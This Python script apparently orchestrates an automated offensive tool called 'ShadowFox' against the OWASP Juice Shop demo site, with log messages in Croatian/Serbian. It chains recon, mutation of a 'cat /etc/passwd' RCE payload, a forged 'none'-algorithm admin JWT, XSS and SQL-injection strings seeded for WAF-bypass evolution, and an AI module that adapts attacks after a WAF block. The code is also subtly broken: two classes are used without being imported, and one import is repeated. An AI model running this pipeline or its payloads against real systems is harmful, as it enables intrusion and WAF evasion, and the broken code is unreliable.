import time
import logging
from core.shadowfox_db import ShadowFoxDB
from agents.recon_agent import ReconAgent
from agents.mutation_engine import ShadowFoxMutationEngine
from agents.recon_agent import ReconAgent
from agents.genetic_engine import GeneticWAFBypass
from agents.jwt_attack import JWTForgeAI

# Init
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("ShadowFox18")
db = ShadowFoxDB("data/shadowfox.db")

# Config
TARGET_URL = "https://juice-shop.herokuapp.com"
MISSION_ID = f"sf18_{int(time.time())}"

logger.info(f"🎯 Pokrećem misiju: {MISSION_ID} na metu: {TARGET_URL}")

# === 1. RECON ===
logger.info("🔍 [1] ReconAgent: Počinje analiza mete")
recon_agent = ReconAgent(operator=None)
recon_data = recon_agent.analyze_target(TARGET_URL, mission_id=MISSION_ID)
db.log_recon_result(MISSION_ID, recon_data)

# === 2. MUTATION ===
logger.info("🧬 [2] MutationEngine: Generišem RCE mutacije")
mutation_engine = ShadowFoxMutationEngine()
rce_mutations = mutation_engine.mutate_rce_payload("cat /etc/passwd", intensity=2)
db.log_mutation(MISSION_ID, [m.__dict__ for m in rce_mutations[:5]])  # Log top 5

# === 3. JWT ATTACK ===
logger.info("🔐 [3] JWTForgeAI: Simuliram JWT napad")
jwt_module = JWTForgeAI(mission_id=MISSION_ID)
fake_token = "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."  # fake token
jwt_info = jwt_module.decode_jwt_safe(fake_token)
if jwt_info:
    result = jwt_module.attempt_none_algorithm(jwt_info)
    db.log_jwt_attack(MISSION_ID, result.__dict__)

# === 4. GENETIC WAF BYPASS ===
logger.info("🧠 [4] GeneticEngine: Kreiram početnu populaciju za WAF bypass")
genetic = GeneticWAFBypass()
genetic.create_initial_population(["<script>alert(1)</script>", "' OR 1=1 --"])
# Skipping full evolution for now

# === 5. AI CORE ===
logger.info("🤖 [5] CL0D Core: AI adaptacija strategije")
core = CL0D_Neural_Core()
response = AttackResponse(
    status_code=403,
    response_time=1.3,
    headers={"Server": "cloudflare"},
    body="Access denied by WAF",
    defense_signatures=[],
    success_indicators=[],
    failure_indicators=["waf", "403"],
    adaptation_hints=[],
    timestamp=time.time()
)
decision = core.calculate_adaptation_strategy(response, [])
db.log_ai_decision(MISSION_ID, decision.__dict__)

logger.info("✅ Misija završena. Svi rezultati su logovani.")
